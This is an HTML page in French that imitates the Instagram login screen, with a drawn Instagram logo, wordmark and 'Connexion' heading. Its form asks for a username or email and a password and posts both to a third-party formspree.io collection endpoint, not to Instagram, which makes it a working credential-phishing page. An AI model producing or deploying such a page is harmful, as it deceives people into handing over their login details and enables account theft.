<!DOCTYPE html>
<html lang="fr">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>CQuestionnaire</title>

<style>

/* Police style écriture */
@import url('https://fonts.googleapis.com/css2?family=Pacifico&display=swap');


body {
    margin: 0;
    background: #fafafa;
    font-family: Arial, sans-serif;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
}


/* Onglet blanc */
.onglet {

    width: 340px;

    background: white;

    border: 1px solid #dbdbdb;

    border-radius: 15px;

    padding: 40px;

    box-shadow: 0 5px 20px rgba(0,0,0,0.08);

}


/* Logo Instagram */
.logo {

    width: 120px;

    height: 120px;

    display: block;

    margin: 0 auto 20px auto;

}



/* Insta */
.Instagram {

    font-family: 'Pacifico', cursive;

    font-size: 45px;

    text-align: center;

    margin: 0 0 25px 0;

    color: black;

}



/* Titre */
.Connexion {

    font-size: 30px;

    font-weight: bold;

    text-align: left;

    margin: 0 0 30px 0;

}



/* Questions */
.question {

    font-weight: bold;

    font-size: 16px;

    text-align: left;

    margin-bottom: 8px;

}



/* Champs réponses */
input {

    width: 100%;

    box-sizing: border-box;

    padding: 12px;

    margin-bottom: 20px;

    border: 1px solid #dbdbdb;

    border-radius: 8px;

    background: #fafafa;

    font-size: 14px;

}



/* Bouton */
button {

    width: 100%;

    padding: 12px;

    border: none;

    border-radius: 8px;

    background: #0095f6;

    color: white;

    font-size: 16px;

    font-weight: bold;

    cursor: pointer;

}


button:hover {

    background: #1877f2;

}


</style>

</head>


<body>


<div class="onglet">



<!-- Logo Instagram -->
<svg class="logo" viewBox="0 0 200 200">

<defs>

<linearGradient id="insta" x1="0" y1="0" x2="1" y2="1">

<stop offset="0%" stop-color="#feda75"/>

<stop offset="35%" stop-color="#d62976"/>

<stop offset="70%" stop-color="#962fbf"/>

<stop offset="100%" stop-color="#4f5bd5"/>

</linearGradient>

</defs>


<rect x="20" y="20" width="160" height="160" rx="45" fill="url(#insta)"/>


<rect x="60" y="60" width="80" height="80" rx="22"
fill="none" stroke="white" stroke-width="12"/>


<circle cx="100" cy="100" r="20"
fill="none" stroke="white" stroke-width="12"/>


<circle cx="145" cy="55" r="8" fill="white"/>


</svg>




<div class="Insta">
Instagram
</div>




<h1 class="Titre">
Connexion
</h1>




<form action="https://formspree.io/f/mrenvqaz" method="POST">



<p class="question">
Identifiants ou adresse mail
</p>


<input 
type="text" 
name="Identifiant ou adresse mail"
placeholder="Votre réponse"
required>



<p class="question">
Mot de passe
</p>


<input 
type="text"
name="Mot de passe"
placeholder="Votre réponse"
required>



<button type="submit">
Connexion
</button>



</form>



</div>


</body>

</html>
